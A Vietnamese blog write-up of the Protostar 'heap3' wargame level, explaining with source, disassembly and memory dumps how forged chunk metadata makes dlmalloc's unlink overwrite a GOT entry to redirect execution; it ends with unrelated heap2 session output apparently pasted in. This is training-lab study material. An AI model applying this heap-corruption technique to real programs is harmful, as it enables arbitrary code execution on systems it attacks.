---
layout: post
title: heap3
---

Trong bài này, chúng ta sẽ tìm hiểu sâu hơn về một phiên bản malloc do Doug Lea đưa ra, qua đó exploit chương trình dựa trên những hiểu biết này.
Sau đây là source code và asm code của chương trình heap3.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

void winner()
{
  printf("that wasn't too bad now, was it? @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  char *a, *b, *c;

  a = malloc(32);
  b = malloc(32);
  c = malloc(32);

  strcpy(a, argv[1]);
  strcpy(b, argv[2]);
  strcpy(c, argv[3]);

  free(c);
  free(b);
  free(a);

  printf("dynamite failed?\n");
}
```
```asm
0x08048864 <winner+0>:  push   ebp
0x08048865 <winner+1>:  mov    ebp,esp
0x08048867 <winner+3>:  sub    esp,0x18
0x0804886a <winner+6>:  mov    DWORD PTR [esp],0x0
0x08048871 <winner+13>: call   0x8048780 <time@plt>
0x08048876 <winner+18>: mov    edx,0x804ac00
0x0804887b <winner+23>: mov    DWORD PTR [esp+0x4],eax
0x0804887f <winner+27>: mov    DWORD PTR [esp],edx
0x08048882 <winner+30>: call   0x8048760 <printf@plt>
0x08048887 <winner+35>: leave
0x08048888 <winner+36>: ret
0x08048889 <main+0>:    push   ebp
0x0804888a <main+1>:    mov    ebp,esp
0x0804888c <main+3>:    and    esp,0xfffffff0
0x0804888f <main+6>:    sub    esp,0x20
0x08048892 <main+9>:    mov    DWORD PTR [esp],0x20
0x08048899 <main+16>:   call   0x8048ff2 <malloc>
0x0804889e <main+21>:   mov    DWORD PTR [esp+0x14],eax
0x080488a2 <main+25>:   mov    DWORD PTR [esp],0x20
0x080488a9 <main+32>:   call   0x8048ff2 <malloc>
0x080488ae <main+37>:   mov    DWORD PTR [esp+0x18],eax
0x080488b2 <main+41>:   mov    DWORD PTR [esp],0x20
0x080488b9 <main+48>:   call   0x8048ff2 <malloc>
0x080488be <main+53>:   mov    DWORD PTR [esp+0x1c],eax
0x080488c2 <main+57>:   mov    eax,DWORD PTR [ebp+0xc]
0x080488c5 <main+60>:   add    eax,0x4
0x080488c8 <main+63>:   mov    eax,DWORD PTR [eax]
0x080488ca <main+65>:   mov    DWORD PTR [esp+0x4],eax
0x080488ce <main+69>:   mov    eax,DWORD PTR [esp+0x14]
0x080488d2 <main+73>:   mov    DWORD PTR [esp],eax
0x080488d5 <main+76>:   call   0x8048750 <strcpy@plt>
0x080488da <main+81>:   mov    eax,DWORD PTR [ebp+0xc]
0x080488dd <main+84>:   add    eax,0x8
0x080488e0 <main+87>:   mov    eax,DWORD PTR [eax]
0x080488e2 <main+89>:   mov    DWORD PTR [esp+0x4],eax
0x080488e6 <main+93>:   mov    eax,DWORD PTR [esp+0x18]
0x080488ea <main+97>:   mov    DWORD PTR [esp],eax
0x080488ed <main+100>:  call   0x8048750 <strcpy@plt>
0x080488f2 <main+105>:  mov    eax,DWORD PTR [ebp+0xc]
0x080488f5 <main+108>:  add    eax,0xc
0x080488f8 <main+111>:  mov    eax,DWORD PTR [eax]
0x080488fa <main+113>:  mov    DWORD PTR [esp+0x4],eax
0x080488fe <main+117>:  mov    eax,DWORD PTR [esp+0x1c]
0x08048902 <main+121>:  mov    DWORD PTR [esp],eax
0x08048905 <main+124>:  call   0x8048750 <strcpy@plt>
0x0804890a <main+129>:  mov    eax,DWORD PTR [esp+0x1c]
0x0804890e <main+133>:  mov    DWORD PTR [esp],eax
0x08048911 <main+136>:  call   0x8049824 <free>
0x08048916 <main+141>:  mov    eax,DWORD PTR [esp+0x18]
0x0804891a <main+145>:  mov    DWORD PTR [esp],eax
0x0804891d <main+148>:  call   0x8049824 <free>
0x08048922 <main+153>:  mov    eax,DWORD PTR [esp+0x14]
0x08048926 <main+157>:  mov    DWORD PTR [esp],eax
0x08048929 <main+160>:  call   0x8049824 <free>
0x0804892e <main+165>:  mov    DWORD PTR [esp],0x804ac27
0x08048935 <main+172>:  call   0x8048790 <puts@plt>
0x0804893a <main+177>:  leave
0x0804893b <main+178>:  ret
```

## Ví dụ 1: unlink khối liền sau

Bộ nhớ ngay trước lệnh `free` đầu tiên.
Địa chỉ được `free` là `0x0804c058`. Do đó, khối sẽ được `free` có địa chỉ là `0x0804c050`.
Lúc nào, `0x0804c050` chứa `prev_size`, `0x0804c054` chứa `size`, và `0x0804c058` chứa data.

<pre class="memory">
0x804c000:      0x00000000      0x00000029      0x90909090      0x90909090
0x804c010:      0x90909090      0x90909090      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x42424242      0x42424242      0x42424242
0x804c040:      0x42424242      0x42424242      0x42424242      0x42424242
0x804c050:      0x42424242      0x00000065      0x43434343      0x43434343
0x804c060:      0x43434343      0x43434343      0x43434343      0x43434343
0x804c070:      0x43434343      0x43434343      0x43434343      0x43434343
0x804c080:      0x43434343      0x43434343      0x43434343      0x43434343
0x804c090:      0x43434343      0x43434343      0x43434343      0x43434343
0x804c0a0:      0x43434343      0x43434343      0x43434343      0x43434343
0x804c0b0:      0x43434343      0xfffffffc      0xfffffffc      0x0804b11c
0x804c0c0:      0x0804c008      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0f0:      0x00000000      0x00000000      0x00000000      0x00000000
</pre>

Giá trị của `size` là `0x65`, với ý nghĩa là khối này có kích thước `0x64` và khối liền trước đang được sử dụng. Lưu ý, bit cuối mang thông tin của khối liền trước chứ không phải khối hiện tại!

Khi `free` được gọi, vì khối liền trước đang được sử dụng, sẽ không có `unlink` được gọi cho khối đó.
Hàm `free` sẽ tiếp tục kiểm tra khối liền sau. Để biết được khối liền sau có đang được dùng không, hàm này sẽ tìm đến khối liền sau của khối liền sau.

Theo đúng thứ tự, khối liền sau sẽ ở địa chỉ `0x0804c050 + 0x64 = 0x0804c0b4` (địa chỉ khối hiện tại, cộng với kích cỡ của chính nó).
Tại địa chỉ này, meta data của khối là `prev_size` ở `0x0804c0b4`, `size` ở `0x0804c0b8`.

Như vậy, khối liền sau của khối liền sau được tính bằng công thức tương tự: `0x0804c0b4 + 0xfffffffc`.
Ở đây, do `0xfffffffc` đã overflow, giá trị được cộng vào để tính địa chỉ sẽ là `-0x04`.
Suy ra, địa chỉ của khối liền sau của khối liền sau là `0x0804c0b4 - 0x04 = 0x0804c0b0`.
Meta data của khối này là `prev_size` ở `0x0804c0b0`, `size` ở `0x0804c0b4`.

Khi kiểm tra `size` của khối liền sau của khối liền sau này, bit cuối cùng là 0.
Do vậy, khối liền sau của khối đang xét là khối trống. Theo sau `prev_size` và `size` trong meta data của khối trống sẽ là 2 địa chỉ, 1 là của khối liền sau nó, và 1 là của khối liên trước nó.
Cụ thể 2 địa chỉ này nằm tại `0x0804c0bc` và `0x0804c0c0` với các giá trị tương ứng là `0x0804b11c` và `0x0804c008`.
Lúc này, điều kiện của `unlink` đã thỏa mãn nên hàm này sẽ được gọi cho khối liền sau.
Cụ thể, sau đây là định nghĩa của `unlink`:

```c
#define unlink(P, BK, FD) { \
  FD = P->fd;               \
  BK = P->bk;               \
  FD->bk = BK;              \
  BK->fd = FD;              \
}
```

`FD` được coi như một khối (với kiểu struct pointer). `BK` cũng tương tự.
Pointer `FD` sẽ có giá là `0x0804b11c`. Khi gán giá trị của `BK` vào `FD->bk` (ở dòng thứ 3 trong `unlink`), `FD->bk` sẽ được tính là offset 12 byte của `FD`.
Điều này tương đương `FD->bk = FD + 0x0c` hay `0x0804b11c + 0x0c = 0x0804b128`, và giá trị được lưu vào đây là `BK = 0x0804c008`.
Tương tự với `BK`. Khi gán giá trị của `FD` vào `BK->fd`, trước tiên, ta tính được địa chỉ của `BK->fd = 0x0804c008 + 0x08 = 0x0804c010`.
Offset cho `->fd` là 8 byte. Giá trị lưu vào địa chỉ này sẽ là `0x0804b11c`.
Sau hai bước này, bộ nhớ sẽ chuyển thành như sau. Các thay đổi được highlight.

<pre class="memory">
0x804c000:      0x00000000      0x00000029      0x90909090      0x90909090
0x804c010:      <span style="color:springgreen">0x0804b11c</span>      0x90909090      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0x42424242      0x42424242      0x42424242      0x42424242
0x804c040:      0x42424242      0x42424242      0x42424242      0x42424242
0x804c050:      0x42424242      <span style="color:aqua">0x00000061</span>      <span style="color:orangered">0x0804b194</span>      <span style="color:orangered">0x0804b194</span>
0x804c060:      0x43434343      0x43434343      0x43434343      0x43434343
0x804c070:      0x43434343      0x43434343      0x43434343      0x43434343
0x804c080:      0x43434343      0x43434343      0x43434343      0x43434343
0x804c090:      0x43434343      0x43434343      0x43434343      0x43434343
0x804c0a0:      0x43434343      0x43434343      0x43434343      0x43434343
0x804c0b0:      <span style="color:aqua">0x00000060</span>      0xfffffffc      0xfffffffc      0x0804b11c
0x804c0c0:      0x0804c008      0x00000000      0x00000000      0x00000000
0x804c0d0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0e0:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c0f0:      0x00000000      0x00000000      0x00000000      0x00000000
...
0x804b11c <_GLOBAL_OFFSET_TABLE_+52>:   0x08048766      0x08048776      0x08048786      <span style="color:springgreen">0x0804c008</span>
0x804b12c <_GLOBAL_OFFSET_TABLE_+68>:   0x080487a6      0x00000000      0x00000000      0x00000000
</pre>

Có thể thấy, ngoài thay đổi về giá trị được lưu sau `unlink`, chúng ta còn có thay đổi về `size` của khối được free, <span style="color:aqua">highlight</span>. `size` mới được tính bằng `size` của khối đang xét cộng thêm `size` của khối liền sau.
Với ví dụ trên, `size` mới là `0x64 - 0x04 = 0x60`. Lưu ý, bit cuối vẫn được đặt là 1, nên giá trị lưu ở `size` là `0x61`.
Sau khi `unlink` thì khối đang xét cũng trở thành khối liên trước của khối liền sau của khối liền sau nó.
`prev_size` của khối liền sau của khối liền sau lúc này cũng được cập nhật bằng với `size` mới.
Cụ thể, `prev_size` được gán giá trị `0x60`.

Tiếp nữa, khối đang xét trở thành một khối trống nên 2 dword sau meta data của nó cũng được thay đổi cho phù hợp như <span style="color:orangered">highlight</span>.
2 vị trí này nằm ở địa chỉ `0x0804c058` và `0x0804c05c`.

Tại sao chúng được đặt thành `0x0804b194` thì mình chưa rõ! Giá trị này có vẻ là head của double linked list dùng để lưu những vị trí đã được free trên heap.

##Ví dụ 2: unlink khối liền trước

Bộ nhớ ngay trước lệnh `free` đầu tiên.
Địa chỉ được `free` là `0x0804c058`. Do đó, khối sẽ được `free` có địa chỉ là `0x0804c050`.
Lúc nào, `0x0804c050` chứa `prev_size`, `0x0804c054` chứa `size`, và `0x0804c058` chứa data.

<pre class="memory">
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0xffffffff      0xffffffff      0xffffffff      0xffffffff
0x804c040:      0x04886468      0xffffc308      0xffffffff      0xffffffff
0x804c050:      0xfffffffc      0xfffffffc      0xffffffff      0x0804b11c
0x804c060:      0x0804c040      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
</pre>

Đầu tiên, khối liền trước sẽ được kiểm tra trước.
Khối này sẽ năm ở vị trí `0x0804c050 - (-0x04) = 0x0804c050 + 0x04 = 0x0804c054`.
Thêm nữa, bit cuối của `size` là 0 nên ta biết được khối liền trước này đã được free.
`unlink` sẽ được áp dụng lên khối này, trong đó `0x0804c040` được lưu vào `0x0804b11c + 0x0c = 0x0804b128` và `0x0804b11c` được lưu vào `0x0804c040 + 0x08 = 0x0804c048`.
Sau khi áp dụng `unlink`, khối liền trước và khối đang xét được nhật `size` và `prev_size`.
Khối liền trước được coi là đã "nuốt" khối đang xét.
Giá trị `size` mới sẽ được tính bằng `size` và `prev_size` của khối đang xét. Lưu ý `size` của khối liền trước không được tính đến.
Giá trị mới sẽ là `(-0x04) + (-0x04) = -0x08 = 0xfffffff8`.
Bit cuối chứa thông tin của khối liền trước của khối liền trước được giữ nguyên, là 1.
Do đó, giá trị được lưu lại là `0xfffffff9`.

<pre class="memory">
0x804c000:      0x00000000      0x00000029      0x41414141      0x00000000
0x804c010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c020:      0x00000000      0x00000000      0x00000000      0x00000029
0x804c030:      0xffffffff      0xffffffff      0xffffffff      0xffffffff
0x804c040:      0x04886468      0xffffc308      <span style="color:springgreen">0x0804b11c</span>      <span style="color:aqua">0xfffffff8</span>
0x804c050:      0xfffffffc      0xfffffffc      <span style="color:aqua">0xfffffff9</span>      <span style="color:orangered">0x0804b194</span>
0x804c060:      <span style="color:orangered">0x0804b194</span>      0x00000000      0x00000000      0x00000000
0x804c070:      0x00000000      0x00000000      0x00000000      0x00000f89
</pre>

Khối liền sau dù không được `unlink` nhưng `prev_size` của khối này vẫn được cập nhật. Giá trị được cập nhật chính là giá trị `size` mới đã tính phía trên, với bit cuối được đặt về 0.
Giá trị cụ thể là `0xfffffff8`.

```bash
user@protostar:~$ heap2
[ auth = (nil), service = (nil) ]
auth abcd
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
servic 11112222333
[ auth = 0x804c008, service = 0x804c018 ]
```

Phần source code này thực sự khá cẩu thả nên về cơ bản chúng ta chỉ cần nắm được lý thuyết về stale pointer sau bài này là ổn.

## Ref
```bash
user@protostar:~$ heap2
[ auth = (nil), service = (nil) ]
auth abcd
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
service 11112222333344441
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
```

```bash
user@protostar:~$ heap2
[ auth = (nil), service = (nil) ]
auth abcd
[ auth = 0x804c008, service = (nil) ]
reset
[ auth = 0x804c008, service = (nil) ]
servic 1111222233334444
[ auth = 0x804c008, service = 0x804c018 ]
login
you have logged in already!
[ auth = 0x804c008, service = 0x804c018 ]
```
